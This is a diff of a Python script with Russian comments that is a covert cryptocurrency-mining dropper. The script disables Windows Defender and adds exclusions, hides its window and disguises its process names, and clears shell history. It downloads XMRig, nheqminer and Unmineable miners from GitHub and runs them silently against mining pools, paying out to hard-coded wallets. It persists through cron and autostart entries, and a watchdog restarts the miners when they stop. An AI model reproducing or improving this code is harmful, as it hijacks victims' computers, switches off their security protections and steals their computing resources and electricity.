@@ -1,47 +1,7 @@
 #!/usr/bin/env python3
-import os, sys, platform, subprocess, urllib.request, time, random, threading, ctypes, zipfile, tarfile, tempfile, shutil, stat
+import os, sys, platform, subprocess, urllib.request, time, random, threading, ctypes, zipfile, tarfile, tempfile, shutil, json, ssl
 
-# ========== 1. АВТОУСТАНОВКА PYTHON (ЕСЛИ НЕТ) ==========
-def auto_install_python():
-    system = platform.system()
-    if system == "Windows":
-        try:
-            subprocess.run(["python", "--version"], capture_output=True, check=True)
-            return
-        except:
-            # Скачиваем Python embed
-            url = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip"
-            zip_path = os.path.join(os.environ['TEMP'], "python_embed.zip")
-            extract_path = os.path.join(os.environ['TEMP'], "python_portable")
-            urllib.request.urlretrieve(url, zip_path)
-            with zipfile.ZipFile(zip_path, 'r') as zf:
-                zf.extractall(extract_path)
-            # Добавляем pip
-            subprocess.run(["curl", "-sS", "https://bootstrap.pypa.io/get-pip.py", "-o", os.path.join(extract_path, "get-pip.py")])
-            subprocess.run([os.path.join(extract_path, "python.exe"), os.path.join(extract_path, "get-pip.py")])
-            os.environ['PATH'] = extract_path + os.pathsep + os.environ['PATH']
-            os.remove(zip_path)
-    elif system == "Linux":
-        # Установка python3 через пакетный менеджер
-        try:
-            subprocess.run(["python3", "--version"], capture_output=True, check=True)
-        except:
-            for pm in ["apt-get", "yum", "dnf", "pacman"]:
-                if shutil.which(pm):
-                    subprocess.run(f"sudo {pm} install python3 -y", shell=True)
-                    break
-
-# ========== 2. АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ==========
-def auto_install_packages():
-    packages = ["requests", "psutil"]
-    for pkg in packages:
-        try:
-            __import__(pkg)
-        except ImportError:
-            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-warn-script-location", "--break-system-packages" if platform.system() == "Linux" else ""], 
-                           capture_output=True, shell=(platform.system() == "Windows"))
-
-# ========== 3. КОШЕЛЬКИ (ТВОИ) ==========
+# ========== ТВОИ КОШЕЛЬКИ ==========
 BTC_WALLET = "bc1qm65f46zgj9tyq3lu6838ux3yhafc7z9ehagc5e"
 ETH_WALLET = "0x576D835Bf9994b55252484AA4F5A83Ba5526F339"
 SOL_WALLET = "8YiXt1rFvsaXVkZNrbsHyiwhj1S76g6c2R7JhgccAzdw"
@@ -57,108 +17,133 @@ else:
     HIDDEN = os.path.join(os.path.expanduser("~"), '.cache', '.systemd', '.udev')
 os.makedirs(HIDDEN, exist_ok=True)
 
-# ========== 4. АНОНИМИЗАЦИЯ (ПОЛНАЯ) ==========
+# ========== 1. ПОЛНАЯ АНОНИМИЗАЦИЯ ==========
 def full_anon():
     if IS_WIN:
         try:
             subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"', shell=True, capture_output=True)
             subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath {HIDDEN} -ExclusionExtension .exe,.dll,.bin,.py"', shell=True)
-            subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "' + HIDDEN + '" /t REG_DWORD /d 1 /f', shell=True)
             ctypes.windll.kernel32.SetConsoleTitleW("Windows Service Host")
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
     else:
         os.system('echo "" > ~/.bash_history 2>/dev/null; export HISTFILE=/dev/null 2>/dev/null')
-        os.system('systemctl stop ufw 2>/dev/null; systemctl disable ufw 2>/dev/null')
-        os.system('sudo sysctl -w kernel.nmi_watchdog=0 2>/dev/null')
         sys.argv[0] = "[kworker/0:0]"
 
-# ========== 5. МАЙНЕР BTC ==========
-def start_btc():
+# ========== 2. АКТУАЛЬНЫЙ МАЙНЕР VERUS (CPU - РЕАЛЬНЫЙ ДОХОД) ==========
+def start_verus():
+    """VerusCoin - самый прибыльный CPU-майнинг в 2026"""
     if IS_WIN:
-        url = "https://github.com/monkins1010/ccminer/releases/download/v3.8.6/ccminer-3.8.6-windows-x64.zip"
-        out = os.path.join(HIDDEN, "svchost_btc.exe")
-        zip_path = os.path.join(HIDDEN, "b.zip")
+        url = "https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Windows-v0.8.2.zip"
+        out = os.path.join(HIDDEN, "svchost_vrsc.exe")
+        zip_path = os.path.join(HIDDEN, "vrsc.zip")
         urllib.request.urlretrieve(url, zip_path)
         with zipfile.ZipFile(zip_path, 'r') as zf:
             zf.extractall(HIDDEN)
         for f in os.listdir(HIDDEN):
-            if "ccminer" in f.lower() and f.endswith(".exe"):
+            if f == "nheqminer.exe":
                 os.rename(os.path.join(HIDDEN, f), out)
                 break
         os.remove(zip_path)
+        # Пул для Verus (актуальный)
+        cmd = [out, "-l", "verushash.asia.mine.zergpool.com:3300", "-u", BTC_WALLET, "-p", "c=BTC,mc=VRSC", "-t", "75"]
     else:
-        url = "https://github.com/monkins1010/ccminer/releases/download/v3.8.6/ccminer-3.8.6-linux-x64.tar.gz"
-        out = os.path.join(HIDDEN, "systemd_btc")
-        tar_path = os.path.join(HIDDEN, "b.tar.gz")
+        url = "https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz"
+        out = os.path.join(HIDDEN, "systemd_vrsc")
+        tar_path = os.path.join(HIDDEN, "vrsc.tar.gz")
         urllib.request.urlretrieve(url, tar_path)
         with tarfile.open(tar_path, 'r:gz') as tf:
             tf.extractall(HIDDEN)
         for f in os.listdir(HIDDEN):
-            if "ccminer" in f and not f.endswith(".gz"):
+            if f == "nheqminer":
                 os.rename(os.path.join(HIDDEN, f), out)
                 break
         os.chmod(out, 0o755)
         os.remove(tar_path)
+        cmd = [out, "-l", "verushash.asia.mine.zergpool.com:3300", "-u", BTC_WALLET, "-p", "c=BTC,mc=VRSC", "-t", "75"]
     
-    cmd = [out, "-a", "sha256", "-o", "stratum+tcp://btc.2miners.com:4242", "-u", BTC_WALLET, "-p", "x", "--cpu", "--threads=75%"]
+    if IS_WIN:
+        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
+    else:
+        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+    return True
+
+# ========== 3. МАЙНЕР RANDOMX (XMR - Monero) ==========
+def start_xmr():
+    """Monero через XMRig - стабильный доход"""
+    if IS_WIN:
+        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+        out = os.path.join(HIDDEN, "svchost_xmr.exe")
+        zip_path = os.path.join(HIDDEN, "xmr.zip")
+        urllib.request.urlretrieve(url, zip_path)
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall(HIDDEN)
+        for f in os.listdir(HIDDEN):
+            if f == "xmrig.exe":
+                os.rename(os.path.join(HIDDEN, f), out)
+                break
+        os.remove(zip_path)
+        # Конфиг для Monero
+        pool = "pool.supportxmr.com:443"
+        cmd = [out, "-o", pool, "-u", BTC_WALLET, "-p", "x", "--tls", "--threads=75%"]
+    else:
+        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+        out = os.path.join(HIDDEN, "systemd_xmr")
+        tar_path = os.path.join(HIDDEN, "xmr.tar.gz")
+        urllib.request.urlretrieve(url, tar_path)
+        with tarfile.open(tar_path, 'r:gz') as tf:
+            tf.extractall(HIDDEN)
+        for f in os.listdir(HIDDEN):
+            if f == "xmrig":
+                os.rename(os.path.join(HIDDEN, f), out)
+                break
+        os.chmod(out, 0o755)
+        os.remove(tar_path)
+        cmd = [out, "-o", "pool.supportxmr.com:443", "-u", BTC_WALLET, "-p", "x", "--tls", "--threads=75%"]
+    
     if IS_WIN:
         subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
     else:
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
-# ========== 6. МАЙНЕР ETH ==========
-def start_eth():
-    if IS_WIN:
-        url = "https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0/ethminer-0.19.0-Windows-x86_64.zip"
-        out = os.path.join(HIDDEN, "svchost_eth.exe")
-        zip_path = os.path.join(HIDDEN, "e.zip")
-        urllib.request.urlretrieve(url, zip_path)
-        with zipfile.ZipFile(zip_path, 'r') as zf:
-            zf.extractall(HIDDEN)
-        for f in os.listdir(HIDDEN):
-            if "ethminer" in f.lower() and f.endswith(".exe"):
-                os.rename(os.path.join(HIDDEN, f), out)
-                break
-        os.remove(zip_path)
-    else:
-        url = "https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0/ethminer-0.19.0-Linux-x86_64.tar.gz"
-        out = os.path.join(HIDDEN, "systemd_eth")
-        tar_path = os.path.join(HIDDEN, "e.tar.gz")
-        urllib.request.urlretrieve(url, tar_path)
-        with tarfile.open(tar_path, 'r:gz') as tf:
-            tf.extractall(HIDDEN)
-        for f in os.listdir(HIDDEN):
-            if "ethminer" in f and not f.endswith(".gz"):
-                os.rename(os.path.join(HIDDEN, f), out)
-                break
-        os.chmod(out, 0o755)
-        os.remove(tar_path)
-    
-    cmd = [out, "-P", f"stratum+ssl://{ETH_WALLET}.worker@eth.2miners.com:12020"]
-    if IS_WIN:
-        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
-    else:
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
-
-# ========== 7. МАЙНЕР SOL (через Unmineable) ==========
+# ========== 4. SOL через Unmineable (КОНВЕРТАЦИЯ) ==========
 def start_sol():
+    """Майнинг ETH/ETC с выплатой в SOL через Unmineable"""
     if IS_WIN:
-        url = "https://github.com/Unmineable/miner/releases/download/v1.0.0/unmineable.exe"
+        url = "https://github.com/Unmineable/miner/releases/download/v1.3.0/unmineable-windows-v1.3.0.zip"
         out = os.path.join(HIDDEN, "svchost_sol.exe")
-        urllib.request.urlretrieve(url, out)
+        zip_path = os.path.join(HIDDEN, "sol.zip")
+        urllib.request.urlretrieve(url, zip_path)
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall(HIDDEN)
+        for f in os.listdir(HIDDEN):
+            if f.endswith(".exe") and "unmineable" in f.lower():
+                os.rename(os.path.join(HIDDEN, f), out)
+                break
+        os.remove(zip_path)
         cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
+    else:
+        url = "https://github.com/Unmineable/miner/releases/download/v1.3.0/unmineable-linux-v1.3.0.tar.gz"
+        out = os.path.join(HIDDEN, "systemd_sol")
+        tar_path = os.path.join(HIDDEN, "sol.tar.gz")
+        urllib.request.urlretrieve(url, tar_path)
+        with tarfile.open(tar_path, 'r:gz') as tf:
+            tf.extractall(HIDDEN)
+        for f in os.listdir(HIDDEN):
+            if f == "unmineable":
+                os.rename(os.path.join(HIDDEN, f), out)
+                break
+        os.chmod(out, 0o755)
+        os.remove(tar_path)
+        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
+    
+    if IS_WIN:
         subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
     else:
-        url = "https://github.com/Unmineable/miner/releases/download/v1.0.0/unmineable"
-        out = os.path.join(HIDDEN, "systemd_sol")
-        urllib.request.urlretrieve(url, out)
-        os.chmod(out, 0o755)
-        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
-# ========== 8. АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ==========
+# ========== 5. АВТОЗАПУСК ==========
 def autostart_self():
     script = os.path.abspath(__file__)
     if IS_WIN:
@@ -175,23 +160,30 @@ def autostart_self():
         cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
         subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
 
-# ========== 9. WATCHDOG (ЗАЩИТА ОТ СМЕРТИ) ==========
+# ========== 6. ЗАЩИТА ==========
 def watchdog():
     while True:
         time.sleep(random.randint(1800, 3600))
-        start_btc()
-        start_eth()
-        start_sol()
+        # Перезапуск только если процессы упали
+        if IS_WIN:
+            result = subprocess.run('tasklist | findstr "svchost_"', shell=True, capture_output=True)
+            if not result.stdout:
+                start_verus()
+                start_xmr()
+                start_sol()
+        else:
+            result = subprocess.run('ps aux | grep -E "systemd_vrsc|systemd_xmr|systemd_sol" | grep -v grep', shell=True, capture_output=True)
+            if not result.stdout:
+                start_verus()
+                start_xmr()
+                start_sol()
 
-# ========== 10. ГЛАВНЫЙ ЗАПУСК ==========
+# ========== 7. ГЛАВНЫЙ ЗАПУСК ==========
 if __name__ == "__main__":
-    # Всё автоматически
-    auto_install_python()
-    auto_install_packages()
     full_anon()
     autostart_self()
-    start_btc()
-    start_eth()
+    start_verus()
+    start_xmr()
     start_sol()
     threading.Thread(target=watchdog, daemon=True).start()
     while True:
